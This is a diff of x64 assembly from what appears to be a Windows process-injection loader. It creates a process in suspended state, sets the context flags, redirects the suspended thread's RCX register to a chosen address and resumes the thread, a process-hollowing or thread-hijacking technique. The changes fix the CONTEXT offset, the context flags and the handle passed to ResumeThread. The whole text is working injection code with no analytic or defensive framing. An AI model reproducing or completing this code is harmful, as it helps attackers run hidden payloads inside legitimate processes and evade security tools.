@@ -423,7 +423,7 @@ CrtPrc:
 	lea rdx, [rsp + 0x50]
 	xor r8, r8
 	xor r9, r9
-	mov qword [rsp + 0x20], 0x0000000000000000
+	mov qword [rsp + 0x20], 0x0000000000000001
 	mov qword [rsp + 0x28], 0x0000000000000004
 	mov qword [rsp + 0x30], 0x0000000000000000
 	mov qword [rsp + 0x38], 0x0000000000000000
@@ -550,6 +550,7 @@ WProc:
 	mov qword rcx, rax
 	mov qword r12, rax			;Save the thread handle for SetThreadContext.
 	mov qword rdx, [rsp + 0x300]		;Heap address for struct to get populated.
+	mov qword [rdx + 0x30], 0x00010007
 	mov qword rax, [rsp + 0x178]
 	call rax
 	
@@ -558,7 +559,7 @@ WProc:
 	;------------------------------------
 	;Is the RCX value in CONTEXT 136 bytes from the base?
 	mov qword rax, [rsp + 0x300]
-	add rax, 0x88
+	add rax, 0x80
 	mov qword rdx, [rsp + 0x2f8] 
 	mov qword [rax], rdx
 
@@ -580,7 +581,7 @@ WProc:
 	;DWORD ResumeThread(
 	;  [in] HANDLE hThread
 	;);
-	mov qword rcx, r11
+	mov qword rcx, r12
 	mov qword rax, [rsp + 0x188]
 	call rax
 
